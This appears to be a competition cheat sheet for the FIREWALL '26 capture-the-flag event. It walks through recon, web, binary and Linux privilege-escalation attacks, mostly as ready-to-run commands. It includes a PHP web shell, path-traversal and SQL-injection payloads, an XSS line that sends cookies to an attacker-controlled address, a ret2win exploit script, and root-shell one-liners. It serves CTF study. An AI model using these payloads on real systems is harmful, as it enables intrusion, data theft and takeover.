# FIREWALL '26 CTF - ULTIMATE CHEAT SHEET & EXPLOIT PLAYBOOK
*Prepared for the 4-hour CTF competition. Covers all major categories: Web, Binary Exploitation, Cryptography, Forensics/File Servers, and Linux Privilege Escalation.*

---

## TABLE OF CONTENTS
1. [Phase 1: General Reconnaissance & Enumeration](#1-phase-1-general-reconnaissance--enumeration)
2. [Web Exploitation (`MyFileServer`, `Dhanush`, `Pandavas`, Custom Apps)](#2-web-exploitation)
   - 2.1 Path Traversal & Local File Inclusion (LFI)
   - 2.2 Unrestricted File Upload & Remote Code Execution (RCE)
   - 2.3 Insecure Direct Object References (IDOR)
   - 2.4 SQL Injection (SQLi)
   - 2.5 Cross-Site Scripting (XSS - Stored & Reflected)
   - 2.6 JWT (JSON Web Token) Forgery / Tampering
3. [Binary Exploitation & Pwn (`PwnLab`)](#3-binary-exploitation--pwn-pwnlab)
   - 3.1 Basic Buffer Overflow (Ret2Win)
   - 3.2 Format String Vulnerabilities
4. [Linux Privilege Escalation (`PwnLab` / Root Access)](#4-linux-privilege-escalation)
   - 4.1 SUID Binaries & GTFOBins
   - 4.2 Sudo Rights Abuse
   - 4.3 Writable Cron Jobs & Sensitive Files
5. [Cryptography & Miscellaneous](#5-cryptography--miscellaneous)
   - 5.1 Weak Hashes & Password Cracking
   - 5.2 Steganography & File Carving

---

## 1. PHASE 1: GENERAL RECONNAISSANCE & ENUMERATION

Before attacking any target, you must fully map the attack surface.

### Network & Port Scanning
```bash
# Fast TCP port scan
nmap -p- --min-rate=1000 -T4 <target-ip>

# Detailed service and script enumeration on discovered ports
nmap -sC -sV -p<ports> <target-ip> -oN nmap_initial.txt
```

### Web Directory & Endpoint Discovery
```bash
# Gobuster directory brute-forcing
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html,bak

# Dirsearch recursive scan
dirsearch -u http://<target-ip>/ -e php,html,js -x 403,404
```

---

## 2. WEB EXPLOITATION

### 2.1 Path Traversal & Local File Inclusion (LFI)
* **Context:** Often found in file download portals (`MyFileServer 1 & 2`) or view/include parameters (`?page=`, `?file=`, `?path=`).
* **Tools:** Browser, Burp Suite, `curl`.
* **Step-by-Step Exploitation:**
  1. Identify parameters accepting file paths (e.g., `http://target/download.php?file=report.pdf`).
  2. Test basic directory traversal:
     ```text
     http://target/download.php?file=../../../../etc/passwd
     ```
  3. If filtered, try URL encoding or null bytes:
     ```text
     http://target/download.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd
     http://target/download.php?file=../../../../etc/passwd%00
     ```
  4. Look for source code files, database configs (`config.php`, `.env`), or SSH keys (`/home/user/.ssh/id_rsa`).

### 2.2 Unrestricted File Upload & Remote Code Execution (RCE)
* **Context:** Avatar upload forms, document submissions.
* **Tools:** Burp Suite, custom web shells.
* **Step-by-Step Exploitation:**
  1. Prepare a simple PHP web shell (`shell.php`):
     ```php
     <?php system($_GET['cmd']); ?>
     ```
  2. Upload `shell.php`. If blocked by extension filter:
     * Try alternative extensions: `.phtml`, `.php5`, `.phar`, `.php.jpg`.
     * Intercept request in Burp Suite and modify `Content-Type: image/jpeg` to `application/x-httpd-php`.
  3. Locate the uploaded file in the upload directory (`/uploads/shell.php`).
  4. Execute system commands:
     ```text
     http://<target-ip>/uploads/shell.php?cmd=cat+/flag.txt
     ```

### 2.3 Insecure Direct Object References (IDOR)
* **Context:** User profiles, invoices, or object endpoints referencing predictable IDs.
* **Tools:** Burp Suite (Repeater / Intruder).
* **Step-by-Step Exploitation:**
  1. Log into your account and capture a request containing your user ID or object ID (e.g., `/api/user/v1/profile?id=102`).
  2. Send the request to Burp Repeater.
  3. Change `id=102` to `id=101`, `id=100`, or `id=1` to view other users' data.
  4. Use Burp Intruder (Sniper attack) with a number payload (`1` to `500`) to harvest all records.

### 2.4 SQL Injection (SQLi)
* **Context:** Login forms, search bars, ID parameters without parameterized queries.
* **Tools:** `sqlmap`, Burp Suite.
* **Step-by-Step Exploitation:**
  1. **Manual Login Bypass:**
     * Enter username: `admin' --` or `admin' OR '1'='1`
  2. **Automated Extraction with SQLMap:**
     * Save request to a file (`req.txt` via Burp Suite -> Copy to file):
     ```bash
     sqlmap -r req.txt --batch --dbs
     sqlmap -r req.txt -D database_name --tables
     sqlmap -r req.txt -D database_name -T users --dump
     ```

### 2.5 Cross-Site Scripting (XSS - Stored & Reflected)
* **Context:** Feedback forms, contact forms, search queries (`/api/search?q=`).
* **Tools:** Browser Developer Tools, Netcat/Webhook listener.
* **Step-by-Step Exploitation:**
  1. **Reflected XSS (Search API):**
     * Inject payload into search parameter:
     ```text
     http://target/api/search?q=<script>fetch('http://<your-ip>:4444/?cookie='+document.cookie)</script>
     ```
  2. **Stored XSS (Contact/Feedback forms):**
     * Submit payload in form fields. Wait for admin panel view.

### 2.6 JWT (JSON Web Token) Forgery
* **Context:** Authentication tokens containing user roles and claims.
* **Tools:** jwt.io, `john`, Burp Suite.
* **Step-by-Step Exploitation:**
  1. Decode token payload. Check `"role": "user"`.
  2. Change role to `"role": "admin"`.
  3. If signature verification is weak or missing (or `alg: none`), sign or leave unsigned.
  4. If signed with a weak secret, crack it:
     ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt jwt_token.txt
     ```

---

## 3. BINARY EXPLOITATION & PWN (`PwnLab`)

### 3.1 Basic Buffer Overflow (Ret2Win)
* **Context:** Vulnerable binaries using unsafe functions like `gets()`, `strcpy()`, or `sprintf()`.
* **Tools:** `checksec`, `gdb` (with `gef` or `pwndbg`), Python (`pwntools`).
* **Step-by-Step Exploitation:**
  1. Inspect binary security mitigations:
     ```bash
     checksec --file=vuln_binary
     ```
  2. Run binary and find crash offset using cyclic pattern:
     ```python
     from pwn import *
     # Generate cyclic pattern, send to binary, find exact crash offset via EIP/RIP
     ```
  3. Locate the target function address (`win()` or `print_flag()`) using `objdump` or `gdb`:
     ```bash
     objdump -d vuln_binary | grep win
     ```
  4. Construct exploit payload script (`exploit.py`):
     ```python
     from pwn import *

     target = process('./vuln_binary') # or remote('ip', port)
     offset = 72 # example offset
     win_addr = p64(0x401162) # example address

     payload = b'A' * offset + win_addr
     target.sendline(payload)
     target.interactive()
     ```

---

## 4. LINUX PRIVILEGE ESCALATION

### 4.1 SUID Binaries & GTFOBins
* **Context:** System files with user ID set to root (`s` permission).
* **Step-by-Step Exploitation:**
  1. Find all SUID binaries on the system:
     ```bash
     find / -perm -4000 2>/dev/null
     ```
  2. Check discovered binaries against [GTFOBins](https://gtfobins.github.io/).
  3. Example exploiting `find` SUID:
     ```bash
     find . -exec /bin/sh -p \;
     ```

### 4.2 Sudo Rights Abuse
* **Context:** Commands the current user can run as root.
* **Step-by-Step Exploitation:**
  1. Check sudo privileges:
     ```bash
     sudo -l
     ```
  2. If allowed to run python, vim, nano, or awk as root:
     ```bash
     sudo python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
     sudo vim -c ':shell'
     ```

### 4.3 Writable Cron Jobs & Sensitive Files
* **Step-by-Step Exploitation:**
  1. Inspect crontab schedules:
     ```bash
     cat /etc/crontab
     ls -la /etc/cron.d/
     ```
  2. If a script executed periodically by root is owned or writable by you, append a reverse shell or flag copy command:
     ```bash
     echo "cat /root/root.txt > /tmp/flag.txt" >> /path/to/script.sh
     ```

---

## 5. CRYPTOGRAPHY & MISCELLANEOUS

### 5.1 Weak Hashes & Password Cracking
* **Tools:** `hashcat`, `john`.
* **Commands:**
  ```bash
  # Identify hash type (if unknown)
  hashid hash.txt

  # Crack MD5 / SHA-256 with John
  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

  # Crack with Hashcat
  hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
  ```

### 5.2 Steganography & File Carving
* **Tools:** `steghide`, `binwalk`, `exiftool`.
* **Commands:**
  ```bash
  # Extract metadata
  exiftool image.jpg

  # Extract hidden files embedded in images
  steghide extract -sf image.jpg

  # Carve embedded files from archives or images
  binwalk -e image.png
  ```

---
*Good luck tomorrow at FIREWALL '26! Think smart, enumerate thoroughly, and capture the flag.*
